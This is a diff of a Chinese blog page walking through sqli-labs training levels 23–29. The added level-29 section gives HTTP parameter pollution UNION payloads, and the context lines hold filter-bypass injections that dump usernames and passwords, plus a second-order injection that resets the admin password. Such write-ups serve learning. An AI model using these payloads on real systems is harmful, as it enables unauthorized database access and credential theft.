@@ -96,7 +96,7 @@
 <meta name="description" content="人生海海，又何必在意一时浮沉。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sql-lab 23-27">
-<meta property="og:url" content="https://quan9i.github.io/sql-lab23%E5%90%AF/index.html">
+<meta property="og:url" content="https://quan9i.top/sql-lab23%E5%90%AF/index.html">
 <meta property="og:site_name" content="quan9i&#39;s blog">
 <meta property="og:description" content="人生海海，又何必在意一时浮沉。">
 <meta property="og:locale" content="zh_CN">
@@ -136,7 +136,7 @@
 <meta property="og:image" content="https://img-blog.csdnimg.cn/cface75d75ec4221a810f79772e07439.png">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/acab9083e7a642d0a33284ed3c3e6d21.png">
 <meta property="article:published_time" content="2022-01-19T06:44:56.804Z">
-<meta property="article:modified_time" content="2022-01-23T14:01:26.329Z">
+<meta property="article:modified_time" content="2022-03-11T09:55:09.662Z">
 <meta property="article:author" content="quan9i">
 <meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
@@ -170,7 +170,7 @@
 
 
 
-  <link rel="canonical" href="https://quan9i.github.io/sql-lab23启/"/>
+  <link rel="canonical" href="https://quan9i.top/sql-lab23启/"/>
 
 
 
@@ -406,7 +406,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://quan9i.github.io/sql-lab23%E5%90%AF/">
+    <link itemprop="mainEntityOfPage" href="https://quan9i.top/sql-lab23%E5%90%AF/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -499,7 +499,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.5k
+                  1.8k
                 </span>
               
 
@@ -515,7 +515,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  6
+                  8
                 </span>
               
             </div>
@@ -541,7 +541,7 @@
 <h1><span id="sql-lab-23">sql-lab 23</span></h1><p>源码如下图所示<br><img src="https://img-blog.csdnimg.cn/f1430cd11f294e40b8d4cab1d63677b6.png" alt="在这里插入图片描述"><br>如图可见注释符被转义了，因此在这一关无法使用注释符来执行sql注入，猜解出包裹方式为’后，我们可以利用’来作为注释符，<br>此时写payload可以使用两种</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,&#x27;</span><span class="number">3</span>或</span><br><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,3 or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
 <p>使用联合查询即可查询出回显位，然后开始进行sql注入，得到数据库等数据</p>
-<h1><span id="sql-lab-24">sql-lab 24</span></h1><p>此关利用了二次注入，具体可以观看<a href="https://quan9i.github.io/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/">此篇文章</a><br>进入界面后如下图所示<br><img src="https://img-blog.csdnimg.cn/5345d1aa85ae43209070fbbfe9453555.png" alt="在这里插入图片描述"><br>发现下方有注册的，我们点击注册，用弱口令admin来尝试，命名为admin’#，密码设置为111，如下图<br><img src="https://img-blog.csdnimg.cn/3b04cc57f22d44fa9896d6326124b298.png" alt="在这里插入图片描述"><br>此时查询数据库，发现注册的已经插入数据库中<br><img src="https://img-blog.csdnimg.cn/e82186b3da214199b1983c1572ffd6a5.png" alt="在这里插入图片描述"><br>我们登录看看，如下图<br><img src="https://img-blog.csdnimg.cn/14dba507c8fc4a72ae201ef26c5f12c5.png" alt="在这里插入图片描述"><br>发现是更改密码的，我们试着将111改123，此时查看数据库<br><img src="https://img-blog.csdnimg.cn/f2157307c46143f2879df89b081d3b93.png" alt="在这里插入图片描述"><br>发现更改了admin的密码，即说明注入成功！<br>二次注入简单利用完成！</p>
+<h1><span id="sql-lab-24">sql-lab 24</span></h1><p>此关利用了二次注入，具体可以观看<a target="_blank" rel="noopener" href="https://quan9i.github.io/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/">此篇文章</a><br>进入界面后如下图所示<br><img src="https://img-blog.csdnimg.cn/5345d1aa85ae43209070fbbfe9453555.png" alt="在这里插入图片描述"><br>发现下方有注册的，我们点击注册，用弱口令admin来尝试，命名为admin’#，密码设置为111，如下图<br><img src="https://img-blog.csdnimg.cn/3b04cc57f22d44fa9896d6326124b298.png" alt="在这里插入图片描述"><br>此时查询数据库，发现注册的已经插入数据库中<br><img src="https://img-blog.csdnimg.cn/e82186b3da214199b1983c1572ffd6a5.png" alt="在这里插入图片描述"><br>我们登录看看，如下图<br><img src="https://img-blog.csdnimg.cn/14dba507c8fc4a72ae201ef26c5f12c5.png" alt="在这里插入图片描述"><br>发现是更改密码的，我们试着将111改123，此时查看数据库<br><img src="https://img-blog.csdnimg.cn/f2157307c46143f2879df89b081d3b93.png" alt="在这里插入图片描述"><br>发现更改了admin的密码，即说明注入成功！<br>二次注入简单利用完成！</p>
 <h1><span id="sql-lab-25">sql-lab 25</span></h1><p>观察题目，其中说“or 和 and 属于我们了”<br><img src="https://img-blog.csdnimg.cn/b665a3267ea348d0a7da4dc4210dee96.png" alt="在这里插入图片描述"><br>源码如下图所示<br><img src="https://img-blog.csdnimg.cn/192bf7b24b6749189210b0308ccaf3bb.png" alt="在这里插入图片描述"><br>可以看出and 和 or 被过滤掉了，因此我们可以采用的方法有以下几种</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）编码，hex，urlencode</span><br><span class="line">（<span class="number">2</span>）利用符号 <span class="keyword">and</span>=&amp;&amp; <span class="keyword">or</span>=||</span><br><span class="line">（<span class="number">3</span>）双写绕过 oorr</span><br></pre></td></tr></table></figure>
 <p>在查询列数时候，发现无法正确注入<br><img src="https://img-blog.csdnimg.cn/1549b4411653467cac6514c2c487fe60.png" alt="在这里插入图片描述"><br>发现order 变成了der，这是因为order by中也含有or，此时我们可以通过双写来正确执行，代码</p>
@@ -600,6 +600,11 @@
 <p>执行结果<br><img src="https://img-blog.csdnimg.cn/cface75d75ec4221a810f79772e07439.png" alt="在这里插入图片描述"></p>
 <h2><span id="查询字段信息">查询字段信息</span></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;)union%0dunion%0dselectselect%0d1,(select%0agroup_concat(concat_ws(0x7e,username,password))%0afrom%0ausers),(&#x27;</span><span class="number">3</span></span><br></pre></td></tr></table></figure>
 <p>执行结果<br><img src="https://img-blog.csdnimg.cn/acab9083e7a642d0a33284ed3c3e6d21.png" alt="在这里插入图片描述"></p>
+<h1><span id="sql-lab-29">sql-lab 29</span></h1><p>本关提到了waf啊，waf是啥我都不知道，咋整啊，查呗，</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Web应用防火墙（WAF）. Web应用防火墙（WAF）对网站或者<span class="keyword">APP</span>的业务流量进行恶意特征识别及防护，将正常、安全的流量回源到服务器。</span><br></pre></td></tr></table></figure>
+<p>对于本关，我们查看一下源文件，发现有三个，在index中没有找到过滤的，我们切换到其他地方，最终在login.php中找到过滤的地方，代码如下</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> java_implimentation(<span class="variable">$query_string</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$q_s</span> = <span class="variable">$query_string</span>;</span><br><span class="line">    <span class="variable">$qs_array</span>= explode(<span class="string">&quot;&amp;&quot;</span>,<span class="variable">$q_s</span>);<span class="regexp">//</span>将变量q_s中的字符串以&amp;隔开，分为多个字符</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    foreach(<span class="variable">$qs_array</span> as <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)<span class="regexp">//</span>给value变量赋数组</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$val</span>=substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">2</span>); <span class="regexp">//</span>截取value中的前两位</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$val</span>==<span class="string">&quot;id&quot;</span>) <span class="regexp">//</span>如果前两位是id</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$id_value</span>=substr(<span class="variable">$value</span>,<span class="number">3</span>,<span class="number">30</span>); <span class="regexp">//</span>截取第三位到第<span class="number">30</span>位 </span><br><span class="line">            return <span class="variable">$id_value</span>; <span class="regexp">//</span>返回这个值</span><br><span class="line">            echo <span class="string">&quot;&lt;br&gt;&quot;</span>; <span class="regexp">//</span>输出空格</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里需要介绍一下函数<br><code>explode(x,y,z):第一个变量为截取位置，第二个为截取的字符串，z是可选的，规定返回数目</code><br>此时我们可构造如下payload来进行绕过<br><code>login.php?id=2&amp;id=-1&#39; union select 1,database(),3%23</code><br>爆表<br><code>?id=2&amp;id=-1&#39; union select 1,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),3%23</code></p>
 
       
     </div>
@@ -665,7 +670,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://quan9i.github.io/sql-lab23%E5%90%AF/" title="sql-lab 23-27">https://quan9i.github.io/sql-lab23%E5%90%AF/</a>
+    <a href="https://quan9i.top/sql-lab23%E5%90%AF/" title="sql-lab 23-27">https://quan9i.top/sql-lab23%E5%90%AF/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -807,7 +812,7 @@
               
                 <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">34</span>
+                  <span class="site-state-item-count">36</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -897,7 +902,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">sql-lab 23</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">sql-lab 24</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">sql-lab 25</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">4.</span> <span class="nav-text">sql -lab 25a</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">5.</span> <span class="nav-text">sql -lab 26</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">5.1.</span> <span class="nav-text">查询表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">5.2.</span> <span class="nav-text">查询列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">5.3.</span> <span class="nav-text">查询字段信息</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">6.</span> <span class="nav-text">sql-lab 26a</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">7.</span> <span class="nav-text">sql -lab 27</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">7.1.</span> <span class="nav-text">查询库名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">7.2.</span> <span class="nav-text">查询表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">7.3.</span> <span class="nav-text">查询列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">7.4.</span> <span class="nav-text">查询字段信息</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">8.</span> <span class="nav-text">sql-lab 27a</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">8.1.</span> <span class="nav-text">查询数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">8.2.</span> <span class="nav-text">查询表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">8.3.</span> <span class="nav-text">查询列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">8.4.</span> <span class="nav-text">查询字段信息</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">9.</span> <span class="nav-text">sql-lab 28</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">9.1.</span> <span class="nav-text">查询数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">9.2.</span> <span class="nav-text">查询表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">9.3.</span> <span class="nav-text">查询列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">9.4.</span> <span class="nav-text">查询字段信息</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">sql-lab 23</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">sql-lab 24</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">sql-lab 25</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">4.</span> <span class="nav-text">sql -lab 25a</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">5.</span> <span class="nav-text">sql -lab 26</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">5.1.</span> <span class="nav-text">查询表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">5.2.</span> <span class="nav-text">查询列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">5.3.</span> <span class="nav-text">查询字段信息</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">6.</span> <span class="nav-text">sql-lab 26a</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">7.</span> <span class="nav-text">sql -lab 27</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">7.1.</span> <span class="nav-text">查询库名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">7.2.</span> <span class="nav-text">查询表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">7.3.</span> <span class="nav-text">查询列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">7.4.</span> <span class="nav-text">查询字段信息</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">8.</span> <span class="nav-text">sql-lab 27a</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">8.1.</span> <span class="nav-text">查询数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">8.2.</span> <span class="nav-text">查询表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">8.3.</span> <span class="nav-text">查询列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">8.4.</span> <span class="nav-text">查询字段信息</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">9.</span> <span class="nav-text">sql-lab 28</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">9.1.</span> <span class="nav-text">查询数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">9.2.</span> <span class="nav-text">查询表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">9.3.</span> <span class="nav-text">查询列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">9.4.</span> <span class="nav-text">查询字段信息</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">10.</span> <span class="nav-text">sql-lab 29</span></a></li></ol></div>
             
 
           </div>
@@ -926,6 +931,14 @@
       
       
         <li class="recent_posts_li">
+          <a href="/twofen/" title="sql二进制学习" target="_blank">sql二进制学习</a>
+        </li>
+      
+        <li class="recent_posts_li">
+          <a href="/sqlway/" title="sql注入的部分注入方式" target="_blank">sql注入的部分注入方式</a>
+        </li>
+      
+        <li class="recent_posts_li">
           <a href="/sqlprotect/" title="浅谈防御sql注入" target="_blank">浅谈防御sql注入</a>
         </li>
       
@@ -935,14 +948,6 @@
       
         <li class="recent_posts_li">
           <a href="/vc++/" title="vc 6.0++解决兼容性及闪退问题" target="_blank">vc 6.0++解决兼容性及闪退问题</a>
-        </li>
-      
-        <li class="recent_posts_li">
-          <a href="/c/" title="codeblock报错解决及正确安装" target="_blank">codeblock报错解决及正确安装</a>
-        </li>
-      
-        <li class="recent_posts_li">
-          <a href="/python2/" title="python学习笔记 part 2" target="_blank">python学习笔记 part 2</a>
         </li>
       
     </ul>
@@ -981,7 +986,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">52.9k</span>
+    <span title="Site words total count">57.2k</span>
   
 </div>
 
